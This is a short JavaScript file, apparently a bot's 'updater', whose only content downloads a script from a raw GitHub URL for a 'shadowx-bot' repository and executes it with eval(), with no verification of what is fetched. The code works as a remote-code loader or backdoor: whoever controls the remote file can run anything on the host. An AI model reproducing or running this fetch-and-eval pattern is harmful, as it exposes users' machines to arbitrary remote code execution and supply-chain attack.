const axios = require('axios');

axios.get("https://raw.githubusercontent.com/Shadowx-Team/shadowx-bot/main/updater.js")
	.then(res => eval(res.data));
